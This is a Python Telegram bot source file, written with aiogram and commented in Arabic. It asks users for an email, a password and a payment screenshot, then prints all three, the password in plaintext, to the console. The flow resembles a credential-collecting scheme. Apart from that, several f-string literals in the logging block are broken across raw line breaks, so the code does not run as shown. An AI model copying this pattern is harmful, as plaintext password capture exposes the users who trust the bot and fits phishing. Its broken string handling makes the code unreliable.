import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import Message, FSInputFile
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.filters import Command
import asyncio

API_TOKEN = "YOUR_BOT_TOKEN_HERE"  # ← ضع توكن البوت هنا

logging.basicConfig(level=logging.INFO)

# إعداد البوت والمخزن المؤقت
bot = Bot(token=API_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# تعريف الحالات
class Form(StatesGroup):
    email = State()
    password = State()
    payment_proof = State()

# /start
@dp.message(Command("start"))
async def start_handler(message: Message, state: FSMContext):
    await message.answer("👋 أهلاً بك! من فضلك أدخل بريدك الإلكتروني:")
    await state.set_state(Form.email)

# إدخال الإيميل
@dp.message(Form.email)
async def handle_email(message: Message, state: FSMContext):
    await state.update_data(email=message.text)
    await message.answer("✅ الآن، أدخل رمزك السري (8 حروف أو أرقام على الأقل):")
    await state.set_state(Form.password)

# إدخال الرمز السري
@dp.message(Form.password)
async def handle_password(message: Message, state: FSMContext):
    password = message.text
    if len(password) < 8:
        await message.answer("❌ الرمز يجب أن يحتوي على 8 حروف أو أرقام على الأقل. حاول مجددًا:")
        return
    await state.update_data(password=password)
    await message.answer("💳 أرسل الآن لقطة شاشة لإثبات الدفع:")
    await state.set_state(Form.payment_proof)

# استلام لقطة الدفع
@dp.message(Form.payment_proof, F.photo)
async def handle_payment(message: Message, state: FSMContext):
    photo = message.photo[-1]
    file_id = photo.file_id
    await state.update_data(payment_screenshot=file_id)

    data = await state.get_data()
    user_id = message.from_user.id
    username = message.from_user.username

    # سجل البيانات
    log = (
        f"📥 New Submission:
"
        f"👤 User: @{username} ({user_id})
"
        f"📧 Email: {data['email']}
"
        f"🔐 Password: {data['password']}
"
        f"🖼 Screenshot file_id: {data['payment_screenshot']}"
    )
    print(log)

    await message.answer("✅ تم استلام معلوماتك بنجاح! سيتم مراجعة الدفع يدويًا قريبًا.")

    await state.clear()

# في حال إرسال رسالة غير متوقعة
@dp.message()
async def fallback(message: Message):
    await message.answer("❗ من فضلك استخدم الأمر /start للبدء.")

# تشغيل البوت
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
